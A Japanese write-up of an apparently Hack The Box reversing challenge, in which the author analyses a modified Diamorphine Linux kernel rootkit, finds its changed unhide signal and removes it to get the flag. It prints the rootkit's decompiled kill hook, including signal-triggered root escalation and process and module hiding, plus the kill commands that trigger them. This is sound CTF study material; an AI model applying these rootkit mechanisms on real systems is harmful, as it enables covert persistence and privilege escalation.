---
title: HTB「Cyberpsychosis」Easy
description: RootKitの解除
date: 2026-05-25 13:05:00 +0900
categories: [CyberSecurity, CTF]
tags: [rev, hack_the_box, rootkit]
---

# 20260524-htb-chall-rev-easy-Cyberpsychosis

> - **Category**: Rev
> - **Description**: 悪意のある攻撃者が私たちのシステムに侵入し，カスタム ルートキットを埋め込んだと考えられます．ルートキットを解除して隠しデータを見つけることはできますか？
> - **Tech Stack**: LKM
> - **Flag**: `<credentials>`
{: .prompt-info }

**階層構造**
```
.
├── diamorphine.kofix
└── LICENSE.txt

1 directory, 2 files
```

---
## Solution Path

`.ko (Kernel Object)` という拡張子から推測するに，Linux v2.6以降の **LKM (loadable kernel module)** であることがわかります．
デバッグ情報もあるため，逆解析も比較的楽に行えます．
ファイル名が，**diamorphine** となっているためLKM Rootkitである **Diamorphine Rootkit** であることが分かりました．

```shell
$ file diamorphine.ko 
diamorphine.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=e6a635e5bd8219ae93d2bc26574fff42dc4e1105, with debug_info, not stripped

$ checksec --file=diamorphine.ko
[*] '/home/sl91994/wksp/sec/ctf/htb/challenges/rev/rev-easy-cyberpsychosis/diamorphine.ko'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x0)
    Stripped:   No
    
$ readelf -h diamorphine.ko 
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              REL (Relocatable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x0
  Start of program headers:          0 (bytes into file)
  Start of section headers:          303904 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           0 (bytes)
  Number of program headers:         0
  Size of section headers:           64 (bytes)
  Number of section headers:         47
  Section header string table index: 46
```

### ドキュメントにある **Rootkit** 削除方法の試行

Rootkitを解除するために，README[^1] のUninstallセクションを読みます．
削除するためにはモジュールを表示する必要があります．しかし，モジュールはデフォルトで非表示になっているようなので，サーバに接続し，表示と解除を試みます．
`kill -63 0` を実行すると，**initプロセスの停止によるKernel Panic** が起きました．

> 通常のLinuxでは `kill -63 0` で init は死にませんが，この問題の環境 (QEMU) ではシェルと init が同グループに近い扱いになっており，ルートキットをスルーしたリアルタイムシグナルが `init` に直撃したためカーネルパニックが誘発されたものと思われます．
{: .prompt-info }

本来では `PID 0` に `SIGNAL 63` を送信した際に，RootKitが呼び出しをフックし，シグナルに準拠した処理を割り込ませるはずです．
これにより，元のソースコードが変更されており，デフォルトのキルスイッチでは解除ができないと分かりました．

```shell
$ nc -nv <ip> <port>

~ $ kill -63 0
kill -63 0
RT63
[    6.712538] Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000bf00
[    6.714010] CPU: 0 PID: 1 Comm: init Tainted: G           OE     5.15.0-82-generic #91-Ubuntu
[    6.714635] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org 04/01/2014
[    6.715478] Call Trace:
[    6.716186]  <TASK>
[    6.716484]  show_stack+0x52/0x5c
[    6.717073]  dump_stack_lvl+0x4a/0x63
[    6.717293]  dump_stack+0x10/0x16
[    6.717516]  panic+0x15c/0x334
[    6.717691]  do_exit.cold+0x15/0xa0
[    6.717902]  do_group_exit+0x3b/0xb0
[    6.718102]  __x64_sys_exit_group+0x18/0x20
[    6.718326]  do_syscall_64+0x5c/0xc0
[    6.718520]  ? ksys_read+0x67/0xf0
[    6.718708]  ? exit_to_user_mode_prepare+0x37/0xb0
[    6.718949]  ? syscall_exit_to_user_mode+0x27/0x50
[    6.719204]  ? __x64_sys_read+0x19/0x20
[    6.719411]  ? do_syscall_64+0x69/0xc0
[    6.719617]  ? irqentry_exit+0x1d/0x30
[    6.719822]  ? exc_page_fault+0x89/0x170
[    6.720039]  entry_SYSCALL_64_after_hwframe+0x61/0xcb
[    6.720536] RIP: 0033:0x4df89d
[    6.721093] Code: 00 00 ba 03 00 00 00 0f 05 48 89 c7 e8 1b fe ff ff 48 89 c7 e8 aa fd ff ff 85 c0 79 01 f4 58 c3 48 63 ff b8 e7 00 00 00 0f 05 <ba> 3c 00 00 00 48 89 d0 05
[    6.722132] RSP: 002b:00007ffc24950238 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7
[    6.722594] RAX: ffffffffffffffda RBX: 00007fd028eae030 RCX: 00000000004df89d
[    6.722970] RDX: 00007fd028eae030 RSI: 0000000000000000 RDI: 00000000000000bf
[    6.723444] RBP: 00007ffc24950548 R08: 0000000000000000 R09: 0000000000000000
[    6.724018] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffc24950540
[    6.724448] R13: 00007ffc24950550 R14: 0000000000000000 R15: 0000000000000000
[    6.725009]  </TASK>
[    6.725859] Kernel Offset: 0xc200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[    6.726766] ---[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000bf00 ]---
```

### 変更されたキルスイッチを調査

元のソースコードとデコンパイル結果を比較しながら，読みます．

`hacked_kill(pid_t pid, int sig)`
```c
switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
```

`diamorphine.h` において，`SIGMODINVIS` という制御用シンボルが定義されています．

- **`SIGINVIS = 31`**
    - **機能:** プロセスの隠蔽 (Invisible)
    - このシグナルを送ると，対象のプロセス(または現在のプロセス)を `/proc` 内のプロセスリストから隠す処理が走ります．
- **`SIGSUPER = 64`**
    - **機能:** 権限昇格 (Superuser)
    - 現在のプロセスに `root` 権限を付与する処理です．カーネル内部で，現在のタスク構造体(`task_struct`)の `uid` や `gid` を `0`(root)に書き換える処理に繋がります．
- **`SIGMODINVIS = 63`**
    - **機能:** モジュールの隠蔽 (Module Invisible)
    - このシグナルを送ると，`lsmod` コマンドなどで表示される 「**ロードされたカーネルモジュールの一覧**」 から，Diamorphine **自身を削除(リストから外す)** します．

デコンパイルされた `hacked_kill` と照らし合わせると，`SIGMODINVIS` の比較値が異なります．
変更された `SIGMODINVIS` に値は，`0x2e` であり **46** です．

`hacked_kill()`
```c
int hacked_kill(pt_regs *pt_regs)

{
  undefined1 *puVar1;
  list_head *plVar2;
  int iVar3;
  long lVar4;
  undefined *puVar5;
  
                    /* Unresolved local var: pid_t pid@[???]
                       Unresolved local var: int sig@[???]
                       Unresolved local var: task_struct * task@[???] */
  plVar2 = module_previous;
  iVar3 = (int)pt_regs->si;
  if (iVar3 == 0x2e) { // SIGMODINVIS?
    if (module_hidden != 0) {
      __this_module.list.next = module_previous->next;
      (__this_module.list.next)->prev = &__this_module.list;
      __this_module.list.prev = plVar2;
      module_hidden = 0;
      plVar2->next = (list_head *)0x1010c8;
      return 0;
    }
    iVar3 = 0;
    (__this_module.list.next)->prev = __this_module.list.prev;
    module_previous = __this_module.list.prev;
    (__this_module.list.prev)->next = __this_module.list.next;
    __this_module.list.next = (list_head *)0xdead000000000100;
    __this_module.list.prev = (list_head *)0xdead000000000122;
    module_hidden = 1;
  }
  else if (iVar3 == 0x40) { // SIGSUPER
                    /* Unresolved local var: cred * newcreds@[???] */
    lVar4 = prepare_creds();
    iVar3 = 0;
    if (lVar4 != 0) {
      *(undefined8 *)(lVar4 + 4) = 0;
      *(undefined8 *)(lVar4 + 0xc) = 0;
      *(undefined8 *)(lVar4 + 0x14) = 0;
      *(undefined8 *)(lVar4 + 0x1c) = 0;
      commit_creds(lVar4);
      return iVar3;
    }
  }
  else {
                    /* Unresolved local var: task_struct * p@[???] */
    puVar5 = &init_task;
    if (iVar3 == 0x1f) { // SIGINVIS
      do {
                    /* Unresolved local var: void * __mptr@[???] */
        puVar1 = *(undefined1 **)(puVar5 + 0x8b8);
        puVar5 = puVar1 + -0x8b8;
        if (puVar1 == &DAT_001028f0) {
          return -3;
        }
      } while ((int)pt_regs->di != *(int *)(puVar1 + 0x108));
      if (puVar5 == (undefined *)0x0) {
        return -3;
      }
      *(uint *)(puVar1 + -0x88c) = *(uint *)(puVar1 + -0x88c) ^ 0x10000000;
      return 0;
    }
    lVar4 = (*orig_kill)(pt_regs);
    iVar3 = (int)lVar4;
  }
  return iVar3;
}
```

### Exploitation

1. シグナル `64` で，特権を獲得
2. 変更されたシグナル `46` で，モジュールを表示
3. `rmmod` で，読み込まれているモジュールを外す
4. `find` でフラッグを探索し，入手

```shell
$ nc -nv <ip> <port>

~ $ kill -64 0
kill -64 0

~ # whoami
whoami
root

~ # kill -46 0
kill -46 0

~ # rmmod diamorphine
rmmod diamorphine

~ # find / -type f -name "*.txt" 2>/dev/null                                
find / -type f -name "*.txt" 2>/dev/null
/opt/psychosis/flag.txt

~ # cat /opt/psychosis/flag.txt
cat /opt/psychosis/flag.txt
```

---
## Post-Mortem & Dead ends

## References

- [ローダブル・カーネル・モジュール - Wikipedia](https://ja.wikipedia.org/wiki/%E3%83%AD%E3%83%BC%E3%83%80%E3%83%96%E3%83%AB%E3%83%BB%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%BB%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB)

[^1]: [GitHub - m0nad/Diamorphine: LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86\_64 and ARM64) · GitHub](https://github.com/m0nad/Diamorphine)
